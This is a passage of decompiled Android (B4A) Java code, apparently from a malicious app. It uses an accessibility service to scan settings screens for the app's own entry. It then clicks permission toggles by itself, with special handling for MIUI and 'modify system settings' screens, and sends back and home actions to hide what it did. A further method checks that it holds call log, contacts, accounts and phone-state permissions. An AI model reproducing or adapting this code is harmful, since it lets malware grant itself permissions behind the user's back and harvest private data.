                                backgroundservice backgroundserviceVar9 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants2 = backgroundservice._accservconstants;
                                accessibilityEventsListener6.PerformGlobalAction(2);
                                backgroundservice backgroundserviceVar10 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener7 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                _intpermissionno = 3;
                                IntentWrapper intentWrapper = new IntentWrapper();
                                Intent intent = (Intent) Common.Null;
                                Intent intent2 = intent;
                                _inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper, intent);
                                return "";
                            }
                        }
                        return "";
                    }
                } else if (!BA.ObjectToString(list).toLowerCase().contains("miui") && !_canwritetosystemsettings(ba) && _candrawoverlays(ba) && _check_if_notis(ba)) {
                    new Map();
                    int size4 = list.getSize();
                    boolean z = false;
                    int i5 = 0;
                    while (true) {
                        if (i5 >= size4) {
                            break;
                        }
                        Map map13 = new Map();
                        java.util.Map map14 = (java.util.Map) list.Get(i5);
                        java.util.Map map15 = map14;
                        Map map16 = (Map) AbsObjectWrapper.ConvertToWrapper(map13, map14);
                        String lowerCase2 = BA.ObjectToString(map16.Get("ViewText")).toLowerCase();
                        B4AApplication b4AApplication3 = Common.Application;
                        if (lowerCase2.contains(B4AApplication.getLabelName().toLowerCase())) {
                            z = true;
                        }
                        if (z && !_canwritetosystemsettings(ba) && BA.ObjectToString(map16.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                            backgroundservice backgroundserviceVar11 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener8 = backgroundservice._acs;
                            B4AApplication b4AApplication4 = Common.Application;
                            String labelName = B4AApplication.getLabelName();
                            backgroundservice backgroundserviceVar12 = mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants3 = backgroundservice._accservconstants;
                            Map map17 = new Map();
                            java.util.Map map18 = (java.util.Map) Common.Null;
                            java.util.Map map19 = map18;
                            accessibilityEventsListener8.PerformNodeActionOnViewWithArgs(false, labelName, 16, (Map) AbsObjectWrapper.ConvertToWrapper(map17, map18));
                            backgroundservice backgroundserviceVar13 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener9 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar14 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener10 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar15 = mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants4 = backgroundservice._accservconstants;
                            accessibilityEventsListener10.PerformGlobalAction(1);
                            backgroundservice backgroundserviceVar16 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener11 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar17 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener12 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar18 = mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants5 = backgroundservice._accservconstants;
                            accessibilityEventsListener12.PerformGlobalAction(2);
                            backgroundservice backgroundserviceVar19 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener13 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            _intpermissionno = 3;
                            IntentWrapper intentWrapper2 = new IntentWrapper();
                            Intent intent3 = (Intent) Common.Null;
                            Intent intent4 = intent3;
                            _inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper2, intent3);
                            break;
                        }
                        i5++;
                    }
                    if (!z && _intpermissionno == 2) {
                        backgroundservice backgroundserviceVar20 = mostCurrent._backgroundservice;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener14 = backgroundservice._acs;
                        backgroundservice backgroundserviceVar21 = mostCurrent._backgroundservice;
                        AccessibilityConstants accessibilityConstants6 = backgroundservice._accservconstants;
                        accessibilityEventsListener14.PerformGlobalAction(4);
                        backgroundservice backgroundserviceVar22 = mostCurrent._backgroundservice;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener15 = backgroundservice._acs;
                        AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                        backgroundservice backgroundserviceVar23 = mostCurrent._backgroundservice;
                        backgroundservice._acs.close_notificationbar();
                    }
                } else {
                    int i6 = 0;
                    if (BA.ObjectToString(list).toLowerCase().contains("miui") && !_canwritetosystemsettings(ba) && _candrawoverlays(ba) && _check_if_notis(ba) && _intpermissionno == 2) {
                        new Map();
                        int size5 = list.getSize();
                        int i7 = 0;
                        while (true) {
                            if (i7 >= size5) {
                                break;
                            }
                            Map map20 = new Map();
                            java.util.Map map21 = (java.util.Map) list.Get(i7);
                            java.util.Map map22 = map21;
                            Map map23 = (Map) AbsObjectWrapper.ConvertToWrapper(map20, map21);
                            if (!_canwritetosystemsettings(ba) && BA.ObjectToString(map23.Get("viewid")).toLowerCase().contains("checkbox".toLowerCase())) {
                                backgroundservice backgroundserviceVar24 = mostCurrent._backgroundservice;
                                backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map23.Get("Left")), (int) BA.ObjectToNumber(map23.Get("Top")), (int) BA.ObjectToNumber(map23.Get("width")), (int) BA.ObjectToNumber(map23.Get("Height")), "", "android:id/checkbox");
                                backgroundservice backgroundserviceVar25 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener16 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar26 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener17 = backgroundservice._acs;
                                backgroundservice backgroundserviceVar27 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants7 = backgroundservice._accservconstants;
                                accessibilityEventsListener17.PerformGlobalAction(1);
                                backgroundservice backgroundserviceVar28 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener18 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar29 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener19 = backgroundservice._acs;
                                backgroundservice backgroundserviceVar30 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants8 = backgroundservice._accservconstants;
                                accessibilityEventsListener19.PerformGlobalAction(2);
                                backgroundservice backgroundserviceVar31 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener20 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                _intpermissionno = 3;
                                IntentWrapper intentWrapper3 = new IntentWrapper();
                                Intent intent5 = (Intent) Common.Null;
                                Intent intent6 = intent5;
                                _inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper3, intent5);
                                break;
                            }
                            i7++;
                        }
                    } else if (str2.toLowerCase().contains("modify") && !_canwritetosystemsettings(ba) && _candrawoverlays(ba) && _check_if_notis(ba) && _intpermissionno == 2) {
                        new Map();
                        int size6 = list.getSize();
                        while (true) {
                            if (i6 >= size6) {
                                break;
                            }
                            Map map24 = new Map();
                            java.util.Map map25 = (java.util.Map) list.Get(i6);
                            java.util.Map map26 = map25;
                            Map map27 = (Map) AbsObjectWrapper.ConvertToWrapper(map24, map25);
                            if (!_canwritetosystemsettings(ba) && BA.ObjectToString(map27.Get("viewid")).toLowerCase().contains("switch_widget".toLowerCase())) {
                                backgroundservice backgroundserviceVar32 = mostCurrent._backgroundservice;
                                backgroundservice._acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map27.Get("Left")), (int) BA.ObjectToNumber(map27.Get("Top")), (int) BA.ObjectToNumber(map27.Get("width")), (int) BA.ObjectToNumber(map27.Get("Height")), "", "android:id/switch_widget");
                                backgroundservice backgroundserviceVar33 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener21 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar34 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener22 = backgroundservice._acs;
                                backgroundservice backgroundserviceVar35 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants9 = backgroundservice._accservconstants;
                                accessibilityEventsListener22.PerformGlobalAction(1);
                                backgroundservice backgroundserviceVar36 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener23 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                backgroundservice backgroundserviceVar37 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener24 = backgroundservice._acs;
                                backgroundservice backgroundserviceVar38 = mostCurrent._backgroundservice;
                                AccessibilityConstants accessibilityConstants10 = backgroundservice._accservconstants;
                                accessibilityEventsListener24.PerformGlobalAction(2);
                                backgroundservice backgroundserviceVar39 = mostCurrent._backgroundservice;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener25 = backgroundservice._acs;
                                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                                _intpermissionno = 3;
                                IntentWrapper intentWrapper4 = new IntentWrapper();
                                Intent intent7 = (Intent) Common.Null;
                                Intent intent8 = intent7;
                                _inopenset = (IntentWrapper) AbsObjectWrapper.ConvertToWrapper(intentWrapper4, intent7);
                                break;
                            }
                            i6++;
                        }
                        if (_intpermissionno == 2) {
                            backgroundservice backgroundserviceVar40 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener26 = backgroundservice._acs;
                            backgroundservice backgroundserviceVar41 = mostCurrent._backgroundservice;
                            AccessibilityConstants accessibilityConstants11 = backgroundservice._accservconstants;
                            accessibilityEventsListener26.PerformGlobalAction(4);
                            backgroundservice backgroundserviceVar42 = mostCurrent._backgroundservice;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener27 = backgroundservice._acs;
                            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                            backgroundservice backgroundserviceVar43 = mostCurrent._backgroundservice;
                            backgroundservice._acs.close_notificationbar();
                        }
                    }
                }
            }
        } catch (Exception e) {
            if (ba2.processBA != null) {
                ba2 = ba2.processBA;
            }
            ba2.setLastException(e);
        }
        return "";
    }

    public static boolean _startcalllogperm(BA ba) throws Exception {
        boolean z = true;
        try {
            starter starterVar = mostCurrent._starter;
            RuntimePermissions runtimePermissions = starter._rp;
            starter starterVar2 = mostCurrent._starter;
            RuntimePermissions runtimePermissions2 = starter._rp;
            starter starterVar3 = mostCurrent._starter;
            RuntimePermissions runtimePermissions3 = starter._rp;
            starter starterVar4 = mostCurrent._starter;
            RuntimePermissions runtimePermissions4 = starter._rp;
            starter starterVar5 = mostCurrent._starter;
            RuntimePermissions runtimePermissions5 = starter._rp;
            starter starterVar6 = mostCurrent._starter;
            RuntimePermissions runtimePermissions6 = starter._rp;
            Object[] objArr = {RuntimePermissions.PERMISSION_READ_CALL_LOG, RuntimePermissions.PERMISSION_WRITE_CALL_LOG, RuntimePermissions.PERMISSION_WRITE_CONTACTS, RuntimePermissions.PERMISSION_READ_CONTACTS, RuntimePermissions.PERMISSION_GET_ACCOUNTS, RuntimePermissions.PERMISSION_READ_PHONE_STATE};
            for (int i = 0; i < 6; i++) {
                String ObjectToString = BA.ObjectToString(objArr[i]);
                starter starterVar7 = mostCurrent._starter;
                if (!starter._rp.Check(ObjectToString)) {
                    z = false;
                }
            }
        } catch (Exception e) {
            if (ba.processBA != null) {
                ba = ba.processBA;
            }
            ba.setLastException(e);
        }
        return z;
    }
}